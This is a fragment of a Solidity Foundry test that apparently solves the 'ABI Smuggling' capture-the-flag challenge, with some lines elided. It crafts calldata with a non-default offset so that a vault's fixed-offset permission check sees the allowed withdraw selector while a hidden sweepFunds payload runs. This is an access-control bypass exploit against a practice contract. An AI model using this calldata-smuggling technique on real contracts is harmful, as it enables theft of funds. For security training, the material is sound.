...
contract ABISmugglingChallenge is Test {
    ...
    function test_abiSmuggling() public checkSolvedByPlayer {
        // `withdraw` is (address,address,uint256). Wrapping inner calldata as a single `bytes` argument
        // produces ABI for one dynamic bytes param — not three words — so `functionCall` decodes wrong and reverts.
        // Permission uses fixed offset 100; decoded `actionData` follows the offset word. Use offset 0x80 so
        // bytes 100–103 can be `withdraw` for the check while real payload starts at 4 + 0x80 + 32.
        bytes memory sweepData =
        ...
        bytes memory callData = abi.encodePacked(
            ...
            bytes32(uint256(128)), // offset to `bytes` from byte 4 (not default 0x40)
            bytes32(0),
            bytes4(SelfAuthorizedVault.withdraw.selector), // player can only call withdraw, so cant set sweepFunds here
            bytes28(0),
            bytes32(sweepData.length),
            sweepData
        );
